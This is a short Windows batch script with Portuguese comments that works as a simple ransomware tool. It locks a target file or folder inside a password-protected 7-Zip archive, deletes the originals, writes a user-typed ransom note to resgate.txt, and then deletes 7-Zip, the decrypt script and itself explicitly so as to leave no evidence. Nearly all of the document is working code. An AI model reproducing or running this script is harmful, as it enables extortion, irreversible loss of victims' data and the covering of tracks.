@echo off
setlocal enabledelayedexpansion

::Script batch para "criptografar" um arquivo com senha
::Uso: ranson [ARQUVO] [NOME] [SENHA]
::Exemplo .\ranson.bat .\arquivos\ ttt.kkk 1234

:: variáveis
set caminho_arquivo=%1
set novo_nome_arquivo=%2
set senha=%3

:: Executando comando
".\7z.exe" a -p%senha% -mhe=on %novo_nome_arquivo% %caminho_arquivo%

:: Apagando arquivos originais
if exist %caminho_arquivo% del /s /q %caminho_arquivo%
if exist %caminho_arquivo%\* rmdir /s /q %caminho_arquivo%\

:: Trecho do script que cria um arquivo com uma mensagem
set /p txt=Digite uma mensagem de resgate? :
echo %txt% > ".\resgate.txt"

:: Apagando arquivos para não deixar evidencias
del /s /q 7z.exe
del /s /q 7z.dll
del /s /q ranson-decrypt.bat
del /s /q ranson.bat

:: Fechando script
exit /b 0